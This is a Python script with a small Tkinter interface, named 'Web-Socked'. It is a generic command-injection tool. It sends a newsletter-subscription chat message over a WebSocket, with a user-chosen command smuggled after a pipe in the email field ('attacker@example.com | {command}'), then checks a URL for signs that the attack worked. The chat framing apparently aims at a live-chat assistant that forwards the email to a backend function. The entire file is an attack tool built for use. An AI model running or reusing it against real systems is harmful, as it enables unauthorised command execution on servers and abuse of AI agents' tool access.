import requests
import websocket
import json
import tkinter as tk
from tkinter import simpledialog, messagebox


class GenericSolver:
    def __init__(self, websocket_url, command, response_keyword, check_url, success_keyword):
        self.websocket_url = websocket_url if websocket_url.endswith('/') else websocket_url + '/'
        self.command = command
        self.response_keyword = response_keyword
        self.check_url = check_url
        self.success_keyword = success_keyword
        self.session = requests.Session()

    def send_command_via_websocket(self):
        wss = websocket.create_connection(self.websocket_url)
        message_to_send = f'Hello, I would like to subscribe to the newsletter. This is my email address: attacker@example.com | {self.command}.'
        wss.send(json.dumps({'message': message_to_send}))
        while True:
            response = wss.recv()
            print(f'Received response: {response}')
            if self.response_keyword in response:
                break
        wss.close()

    def check_success(self):
        response = self.session.get(self.check_url)
        if self.success_keyword in response.text:
            print('Action was successful.')
            messagebox.showinfo("Success", "Action was successful.")
        else:
            print('Action was not successful.')
            messagebox.showinfo("Failure", "Action was not successful.")

    def start(self):
        self.send_command_via_websocket()
        self.check_success()


def main():
    # Initialize the Tkinter root window
    root = tk.Tk()
    root.withdraw()  # Hide the root window

    # Create a new top-level window for the GUI
    window = tk.Toplevel(root)
    window.title("Web-Socked")

    # Header
    header = tk.Label(window, text="Web-Socked", font=("Helvetica", 16))
    header.pack(pady=10)

    # Input fields
    websocket_url = simpledialog.askstring("Input", "Enter the WebSocket URL:", parent=window)
    if not websocket_url:
        messagebox.showerror("Error", "WebSocket URL is required", parent=window)
        return

    command = simpledialog.askstring("Input", "Enter the command to inject:", parent=window)
    if not command:
        messagebox.showerror("Error", "Command is required", parent=window)
        return

    response_keyword = simpledialog.askstring("Input", "Enter the response keyword to look for:", parent=window)
    if not response_keyword:
        messagebox.showerror("Error", "Response keyword is required", parent=window)
        return

    check_url = simpledialog.askstring("Input", "Enter the URL to check for success:", parent=window)
    if not check_url:
        messagebox.showerror("Error", "Check URL is required", parent=window)
        return

    success_keyword = simpledialog.askstring("Input", "Enter the success keyword to look for in the response:", parent=window)
    if not success_keyword:
        messagebox.showerror("Error", "Success keyword is required", parent=window)
        return

    # Create GenericSolver instance and start the process
    solver = GenericSolver(websocket_url, command, response_keyword, check_url, success_keyword)
    solver.start()

    # Footer
    footer = tk.Label(window, text="Built by DeadmanXXXII", font=("Helvetica", 10))
    footer.pack(pady=10)

    window.mainloop()


if __name__ == "__main__":
    main()